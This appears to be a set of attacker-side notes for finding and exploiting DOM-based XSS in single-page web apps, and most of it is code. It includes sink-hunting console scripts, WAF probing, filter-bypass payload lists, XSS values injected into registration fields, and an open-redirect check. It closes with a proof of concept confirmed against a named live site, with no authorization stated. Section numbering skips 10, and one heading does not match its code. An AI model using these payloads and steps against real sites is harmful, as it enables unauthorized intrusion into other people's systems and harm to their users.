# DOM-Based XSS Testing Patterns for SPA Targets

## 1. Finding innerHTML Sinks in Inline Scripts

```javascript
// Browser console - extract all inline scripts with innerHTML
(function() {
    var scripts = document.querySelectorAll('script:not([src])');
    var sinks = [];
    scripts.forEach(function(s, i) {
        var text = s.textContent;
        if (text.indexOf('innerHTML') !== -1 || text.indexOf('.html(') !== -1 || text.indexOf('document.write') !== -1) {
            sinks.push({index: i, len: text.length, snippet: text.substring(0, 200)});
        }
    });
    return JSON.stringify(sinks, null, 2);
})();
```

## 2. Tracing Data Flow from Server to DOM

```javascript
// Find all global event handlers (onXxx functions)
var globalFuncs = [];
for (var key in window) {
    if (typeof window[key] === 'function' && key.indexOf('on') === 0) {
        globalFuncs.push(key);
    }
}
// Returns: onRegisterAjaxRequestSuccess, onLoginSuccess, etc.

// Get function source to trace data flow
window.onRegisterAjaxRequestSuccess.toString()
```

## 3. Common SPA XSS Patterns

### Pattern A: AJAX Response → innerHTML
```javascript
// Vulnerable code
$.ajax({
    url: '/Account/GetLoginForm',
    success: function(response) {
        loginFormContainer.innerHTML = response;  // NO SANITIZATION
    }
});
```

### Pattern B: JSON Response → innerHTML
```javascript
// Vulnerable code
window.onRegisterAjaxRequestSuccess = function(response) {
    registerPopup({
        content: response.message  // Passed to innerHTML
    });
};
```

### Pattern C: JSON Response → location.href (Open Redirect)
```javascript
// Vulnerable code
if (response.status === true) {
    window.location.href = response.externalUrl;  // NO URL VALIDATION
}
```

### Pattern D: jQuery .html()
```javascript
$('#container').html(response.message);  // Same as innerHTML
```

## 4. Proving the Sink Works (Client-Side PoC)

```javascript
// Direct call to vulnerable function
registerPopup({
    contentTitle: 'Test',
    content: '<img src=x onerror="document.title=\'XSS-\' + document.domain">'
});

// Verify execution
document.title  // Should be 'XSS-m-coy99.com'
```

## 5. WAF/Filter Detection

### Character-by-Character Testing
```python
test_chars = ['<', '>', '"', "'", '/', '=', '(', ')', '{', '}', 
              'script', 'img', 'svg', 'onerror', 'alert', 'javascript',
              '&', '#', '%', '+', '~', '`', '|', '\\', ';', ':']

for char in test_chars:
    payload = f"test{char}test"
    # POST to endpoint
    # '<' causing 500 = WAF filter
    # All 200 = no filtering
```

### Bypass Techniques When `<` is Blocked
```python
bypass_payloads = [
    # HTML entity encoding
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    
    # Unicode escapes
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    
    # Without < - event handlers in attributes
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    
    # JavaScript protocol
    "javascript:alert(1)",
    
    # Template literals (SSTI test)
    "{{7*7}}",
    "${7*7}",
]
```

## 6. Browser Fingerprinting Detection

```javascript
// Check for common fingerprinting libraries
typeof ThumbmarkJS !== 'undefined'  // ThumbmarkJS
typeof FingerprintJS !== 'undefined'  // FingerprintJS
typeof Fingerprint2 !== 'undefined'  // Fingerprint2

// ThumbmarkJS API
ThumbmarkJS.getVersion()  // Get version
ThumbmarkJS.getThumbmark(function(hash) { console.log(hash); })  // Get fingerprint

// FingerprintJS API
FingerprintJS.load().then(function(fp) { return fp.get(); }).then(function(result) {
    console.log(result.visitorId);
});

// Check hidden input fields
document.querySelectorAll('.visitor_id_input, [name="VisitorId"]')
```

## 7. Registration Flow Analysis

### Extracting Form Structure
```python
# Get registration form via AJAX
reg_req = urllib.request.Request(base + "/Register/AjaxRegisterPopup?language=id",
    data=json.dumps({"isDefaultRegistration": True, "idToken": "", "socialLinkClient": "Unknown"}).encode(),
    headers={
        "Content-Type": "application/json; charset=utf-8",
        "X-Requested-With": "XMLHttpRequest",
    })
```

### Common JSON Response Fields
```json
{
    "status": true/false,
    "message": "Success or error text",
    "statusText": "Berhasil/Gagal",
    "externalUrl": "https://...",  // Open redirect if controllable
    "desktopUrl": "/desktop/home",
    "mobileUrl": "/mobile/home",
    "redirectUrl": "...",
    "platform": 1  // 1=desktop, 2=mobile
}
```

### Attack Vectors
1. **message → innerHTML**: If server echoes user input in message field
2. **externalUrl → location.href**: If attacker can control redirect URL
3. **statusText → innerHTML**: Success/error status display

## 8. Server Response Manipulation

### Testing if Server Echoes User Input
```python
# Test with XSS payloads in various fields
xss_tests = [
    {"UserName": "<img src=x onerror=alert(1)>", ...},
    {"Phone": "<img src=x onerror=alert(1)>", ...},
    {"Email": "<img src=x onerror=alert(1)>@test.com", ...},
]

# Check if payload appears in response.message
if '<img' in response.get('message', ''):
    print("!!! XSS VIA MESSAGE FIELD")
```

### Testing for Open Redirect
```python
# If registration succeeds, check externalUrl
if response.get('status') == True and response.get('externalUrl'):
    # Can we control this URL?
    # Test with different registration params
```

## 9. jQuery Version Check

```javascript
typeof jQuery !== 'undefined' ? jQuery.fn.jquery : 'not loaded'
// jQuery < 3.5.0 has known XSS vulnerabilities in .html() and .append()
```

## 11. Confirmed PoC: registerPopup innerHTML Sink

**Target**: m-coy99.com (Griffin Web API backend)

**Vulnerable code** (Script 16):
```javascript
window.onRegisterAjaxRequestSuccess = (response) => {
    registerPopup({
        contentTitle: response.statusText,
        content: response.message  // <- innerHTML sink
    });
    if (response.status === true) {
        window.location.href = response.externalUrl; // <- open redirect
    }
};

// registerPopup function
({content: c, ...}) => {
    const b = document.createElement('p');
    b.innerHTML = c;  // NO SANITIZATION
    u.appendChild(b);
}
```

**PoC (client-side)**:
```javascript
registerPopup({
    contentTitle: 'Test',
    content: '<img src=x onerror="document.title=\'XSS-PROOF-\' + document.domain">'
});
// Result: document.title = 'XSS-PROOF-m-coy99.com' ✅
```

**Server-side attack vector**:
- If registration response contains user input in `message` field
- If `externalUrl` is controllable
- Blocker: ThumbmarkJS fingerprint token required for registration

## 12. jQuery Version Check

```javascript
// Check for data attributes that might be used in DOM manipulation
var dataElements = document.querySelectorAll('[data-url], [data-href], [data-src]');
Array.from(dataElements).map(function(e) {
    return {tag: e.tagName, url: e.dataset.url || e.dataset.href || e.dataset.src};
});
```
